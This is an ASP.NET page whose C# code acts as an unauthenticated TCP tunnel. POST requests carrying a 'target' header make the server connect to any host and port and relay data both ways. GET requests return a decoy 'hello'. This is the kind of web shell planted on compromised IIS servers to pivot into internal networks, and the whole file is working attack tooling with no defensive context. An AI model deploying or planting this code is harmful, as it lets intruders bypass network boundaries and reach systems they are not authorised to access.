<%@ Page Language="C#"%>
<%
	Response.BufferOutput = false;
    if (!"POST".Equals(Request.HttpMethod))
    {
		            int workerThreads, completionPortThreads;
            System.Threading.ThreadPool.GetMaxThreads(out workerThreads, out completionPortThreads);
            workerThreads += 100;
            completionPortThreads += 100;
            System.Threading.ThreadPool.SetMaxThreads(workerThreads,completionPortThreads);
        Response.Write("hello");
        return;
    }
    Context.Server.ScriptTimeout = int.MaxValue;
    // id
    // type
    // host
    // port
    String[] ts = Request.Headers["target"].Split(',');
    String id = ts[0];
    String type = ts[1];
    System.Net.Sockets.Socket socket = null;
    try
    {
        switch (type)
        {
            case "0"://connect
                string host = ts[2];
                string port = ts[3];
                System.Net.IPAddress ip;
                try
                {
                    ip = System.Net.IPAddress.Parse(host);
                }
                catch (Exception ex)
                {
                    ip = System.Net.Dns.GetHostByName(host).AddressList[0];
                }
                socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                socket.Connect(new System.Net.IPEndPoint(ip, int.Parse(port)));
                Response.AddHeader("status", "succesfully");
                Response.Buffer = false;
                Response.DisableKernelCache();
                //Response.DisableUserCache();
                Application[id] = socket;
                byte[] buffer = new byte[4096];
                int readSize = 1;
                Response.Write(id);
                Response.BinaryWrite(new byte[] { 0x00});
                Response.Flush();
                while (readSize>0)
                {
                    readSize=socket.Receive(buffer);
                    byte[] newBuffer = new byte[readSize];
                    Array.Copy(buffer, newBuffer, readSize);
                    Response.BinaryWrite(newBuffer);
                    Response.Flush();
                }
                break;
            case "1": //write
                socket = (System.Net.Sockets.Socket)Application[id];
                socket.Send(Request.BinaryRead(Request.ContentLength));
                Response.AddHeader("status", "succesfully");
                break;

            case "2"://close
                socket = (System.Net.Sockets.Socket)Application[id];
                Application.Remove(id);
                socket.Close();
                break;

            default:
                break;
        }
    }
    catch (Exception)
    {
        try
        {
            if (socket!=null)
            {
                socket.Close();
            }
        }
        catch (Exception)
        {

        }
        Application.Remove(id);
        Response.AddHeader("status", "close");
    }

    Response.End();
    %>